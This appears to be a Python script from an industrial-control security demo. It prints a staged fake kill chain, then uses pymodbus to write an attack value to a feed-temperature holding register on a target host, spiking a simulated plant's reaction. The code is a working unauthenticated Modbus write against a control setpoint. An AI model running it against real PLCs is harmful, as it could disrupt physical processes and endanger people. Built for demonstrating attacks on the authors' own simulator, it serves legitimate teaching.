"""Scripted adversary emulation. NO exploitation, NO real malware.

Logs a fake kill chain, then does ONE real thing: writes the feed-temp register
to spike the reaction. Target IP/port are command-line flags so you never edit
config at the booth.

Judge one-liner: "scripted adversary emulation against our own simulator,
no exploitation, by design."

  python -m laptop_a.attack --target 192.168.1.42 --port 5020
  python -m laptop_a.attack --target 192.168.1.42 --port 5020 --dry   # no write
"""
import argparse
import time

from shared import config

KILL_CHAIN = [
    ("RECON",    "scanning subnet for Modbus/TCP endpoints"),
    ("DISCOVER", "found PLC exposing holding registers"),
    ("LATERAL",  "pivoting EngWorkstation -> HMI -> PLC1"),
    ("STAGE",    "mapping registers, locating feed-temp setpoint"),
    ("PAYLOAD",  f"writing reg {config.REG_FEED} = {config.T_FEED_ATTACK}K "
                 "(feed-temp spike)"),
]


def red(msg):
    print(f"\033[91m[ATTACK] {msg}\033[0m", flush=True)


def run(target, port, live=True):
    for stage, msg in KILL_CHAIN:
        red(f"{stage:9s} {msg}")
        time.sleep(0.6)

    if not live:
        red("dry run: no register written")
        return

    try:
        from pymodbus.client import ModbusTcpClient
    except Exception:
        red("pymodbus missing -- run: pip install pymodbus")
        return

    c = ModbusTcpClient(target, port=port)
    if not c.connect():
        red(f"could not reach {target}:{port} -- check IP, port, firewall, wifi isolation")
        return
    c.write_register(config.REG_FEED, int(config.T_FEED_ATTACK * config.SCALE))
    red(f"payload delivered to {target}:{port} -- watch the plant temperature climb")
    c.close()


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default=config.BLUE_IP, help="blue laptop IP")
    ap.add_argument("--port", type=int, default=config.MODBUS_PORT,
                    help="match the server's port (use 5020 if server used 5020)")
    ap.add_argument("--dry", action="store_true", help="log kill chain, no write")
    a = ap.parse_args()
    run(a.target, a.port, live=not a.dry)
